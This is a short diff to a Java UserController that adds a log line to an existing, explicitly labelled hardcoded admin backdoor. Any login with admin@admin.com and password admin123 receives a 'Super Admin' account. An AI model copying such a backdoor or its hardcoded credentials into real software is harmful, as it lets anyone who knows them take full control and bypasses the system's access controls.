@@ -39,6 +39,7 @@ public class UserController {
 
         // Hardcoded Admin Backdoor
         if ("admin@admin.com".equalsIgnoreCase(email) && "admin123".equals(password)) {
+            System.out.println("🚨 ADMIN BACKDOOR ACCESSED BY: " + email);
             User adminUser = new User();
             adminUser.setId(9999L);
             adminUser.setName("Super Admin");
